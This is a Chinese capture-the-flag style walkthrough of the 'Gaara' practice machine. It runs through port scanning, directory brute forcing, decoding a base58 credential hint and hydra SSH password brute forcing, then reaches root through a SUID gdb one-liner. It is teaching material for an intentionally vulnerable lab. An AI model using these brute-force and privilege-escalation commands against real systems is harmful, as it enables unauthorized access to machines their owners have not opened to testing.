# OSCP系列靶场-Esay-Gaara

## 总结

getwebshell → 通过大字典爆破得到端点 → 利用工具对比得到加密信息 → 寻求百度帮助确认`加密`方式 → 解密得到用户名 →
`ssh`爆破密码登录

提 权 思 路 → `suid-gdb`提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.194`

![](https://image.3001.net/images/20230807/1691369067_64d03e6bb7d82648bd34a.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.227.142`

![](https://image.3001.net/images/20230807/1691369068_64d03e6ca156c94e290a4.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.227.142
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    

![](https://image.3001.net/images/20230807/1691369069_64d03e6d59fb27660f323.png!small)  
通过两次收集到的端口:`→22,80`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80 192.168.227.142
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
    |   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
    |_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: Gaara
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.7 (87%), Linux 4.4 (87%)
    

![](https://image.3001.net/images/20230807/1691369070_64d03e6e42f277e37ffca.png!small)

## 信息收集-端口测试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 7.9p1 Debian`

    
    
    # 进入msf
    msfconsole
    # 搜索对应脚本
    msf6 > searchsploit openssh 7.9p1
    

![](https://image.3001.net/images/20230807/1691369071_64d03e6f4463031f3a954.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    ssh root @ 192.168.227.142 -v
    # 如果显示publickey、password就是支持密钥以及密码登录
    

![](https://image.3001.net/images/20230807/1691369072_64d03e70185f69da0204c.png!small)

#### 22-SSH弱口令爆破(待定)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.227.142 ssh -s 22
    

静静爆破，等待结果

![](https://image.3001.net/images/20230807/1691369073_64d03e71297ce86ea9329.png!small)

#### 22-SSH手动登录尝试(无)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

    
    
    ssh root<span>@192.168.227.142</span> -p 22
    # 密码尝试
    password > root
    

![](https://image.3001.net/images/20230807/1691369074_64d03e7229e16058a35f2.png!small)

### 80-HTTP端口的信息收集

访问 `http://192.168.227.142:80`是一张我爱罗的图片，应该是一个个人站点，从源码查看开始

![](https://image.3001.net/images/20230807/1691369075_64d03e7315a3ecae1a749.png!small)

#### 信息收集-源码查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.227.142:80
    
        Gaara
            <img src="gaara.jpg" alt="wallpaper" width="100%" height="100%">
           
    

没什么利用信息

![](https://image.3001.net/images/20230807/1691369076_64d03e7427e6656d2a8d3.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.227.142:80 -x 302,403
    
    200 -  137B  - /index.html
    

![](https://image.3001.net/images/20230807/1691369076_64d03e74ed28291fb38b7.png!small)  
发现没有扫描出内容，决定换一个扫描工具上大字典，不清楚脚本语言，先不加

##### 信息收集-目录扫描(深度/大字典)

    
    
    gobuster dir -u http://192.168.227.142:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1000 -k
    

通过大字典扫描出了一个端点`/Cryoserver`

![](https://image.3001.net/images/20230807/1691369077_64d03e75dc2505a81472c.png!small)

#### 信息收集-目录访问

`/Cryoserver`端点访问  
访问 `http://192.168.227.142:80/Cryoserver`发现是空白，进行信息收集尝试，若无思路可能要爆破后缀的字典

##### 信息收集-源码查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.227.142:80/Cryoserver
    

通过查看源码，发现了好像有3个额外的端点

![](https://image.3001.net/images/20230807/1691369078_64d03e76ce1532badab92.png!small)  
尝试进行访问，发现是3篇文章，看上去差不多  
/Temari

![](https://image.3001.net/images/20230807/1691369079_64d03e778ed5b9201b8ea.png!small)  
/Kazekage

![](https://image.3001.net/images/20230807/1691369080_64d03e788b61c5b17ea04.png!small)  
/iamGaara

![](https://image.3001.net/images/20230807/1691369081_64d03e79b52cefdf11282.png!small)

##### 端点分析

利用`wget`下载之后发现还是存在一定的区别的

![](https://image.3001.net/images/20230807/1691369082_64d03e7aed577a98c2d35.png!small)  
通过`chatgpt`的回答下载了文本对比工具`meld`准备对三个文件进行比较

![](https://image.3001.net/images/20230807/1691369084_64d03e7c0633ee52c5c3e.png!small)  
发现文本中存在奇怪的换行以及多了的字符串`f1MgN9mTf9SNbzRygcU`

![](https://image.3001.net/images/20230807/1691369085_64d03e7d0a457f8398bec.png!small)

##### 解密尝试

`f1MgN9mTf9SNbzRygcU`是什么类型的加密呢？？  
试了半天解不出来，百度一搜，emmmmm `base58`

![](https://image.3001.net/images/20230807/1691369086_64d03e7e12b32c3920df0.png!small)  
百度了一个解密工具进行解密 `https://tools.qsnctf.com/tools/Tools/Base58/index.php`

![](https://image.3001.net/images/20230807/1691369086_64d03e7ecb327f7150388.png!small)  
得到了`gaara:ismyname`推测是`ssh`登录的关键

## 漏洞利用-getwebshell

### SSH登录尝试(失败)

获取账号密码之后利用`SSH`进行登录

    
    
    ssh gaara @192.168.227.142 -p22
    password > ismyname
    

发现利用这个方式登录失败，研究`ismyname`的英文确定`gaara`是名字

![](https://image.3001.net/images/20230807/1691369087_64d03e7fa159930fb6817.png!small)

#### 暴力破解-SSH密码爆破hydra

这时候会想生成一个密码字典跑，但是这个网站给的信息太少了，生成`cewl`没用，尝试用`hydra`爆破

    
    
    # -P指定密码字典
    hydra -l gaara -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.227.142 ssh -s 22
    

![](https://image.3001.net/images/20230807/1691369088_64d03e80eb3cfc82b53a0.png!small)

    
    
    [DATA] attacking ssh://192.168.227.142:22/
    [STATUS] 147.00 tries/min, 147 tries in 00:01h, 865 to do in 00:06h, 16 active
    [22][ssh] host: 192.168.227.142   login: gaara   password: iloveyou2
    1 of 1 target successfully completed, 1 valid password found
    

[DATA] attacking ssh://192.168.227.142:22/  
[STATUS] 147.00 tries/min, 147 tries in 00:01h, 865 to do in 00:06h, 16 active  
[22][ssh] host: 192.168.227.142 login: gaara password: iloveyou2  
1 of 1 target successfully completed, 1 valid password found  
得到了`gaara`的密码`iloveyou2`进行`ssh`登录

    
    
    ssh gaara @192.168.227.142  -p22
    password → iloveyou2
    

![](https://image.3001.net/images/20230807/1691369090_64d03e82199e0a0db7bd8.png!small)

## 内网遨游-getshell

### FLAG1获取

    
    
    gaara @Gaara :~$ find / -name local.txt 2>/dev/null
    /home/gaara/local.txt
    gaara @Gaara :~$ cat /home/gaara/local.txt
    c7dde1de7308136cdf71fd56da509c56
    

![](https://image.3001.net/images/20230807/1691369091_64d03e8354511281bde34.png!small)

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    lsb_release -a
    

发行版本为`Debian`，不太能`overlayfs`提权

![](https://image.3001.net/images/20230807/1691369092_64d03e8436c04bb9713be.png!small)

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    uname -a
    

内核版本为`4.19`

![](https://image.3001.net/images/20230807/1691369093_64d03e85379e48fcc6533.png!small)

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码，使用`gaara`的密码失败

![](https://image.3001.net/images/20230807/1691369094_64d03e860c9727cc7f2b2.png!small)

#### 列举出所有suid文件

如果发现`sudo -l`有东西的话

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2>/dev/null
    

访问 `https://gtfobins.github.io`寻找

![](https://image.3001.net/images/20230807/1691369095_64d03e8749538be5c8206.png!small)  
发现存在gdb

![](https://image.3001.net/images/20230807/1691369096_64d03e883ef83388635c8.png!small)

### 权限提升

#### suid-gdb提权

    
    
    sudo install -m =xs $(which gdb) .
    ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    

![](https://image.3001.net/images/20230807/1691369097_64d03e8927f613dfde77f.png!small)  
使用搜集到的提权命令进行提权

    
    
    gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    

提权成功

![](https://image.3001.net/images/20230807/1691369097_64d03e89eff1c92d8614b.png!small)

### FLAG2获取

    
    
    # cat /root/proof.txt
    ec1e6ac3f00776edb8fac5807c14548b
    

完结撒花~

## 反思

从最开始访问80就在提示用户是`gaara`

![](https://image.3001.net/images/20230807/1691369099_64d03e8bd5f7ed4f7e0bd.png!small)  
再到后面发现的目录文件名iam`gaara`也在提示

![](https://image.3001.net/images/20230807/1691369100_64d03e8cc56ac76709e45.png!small)

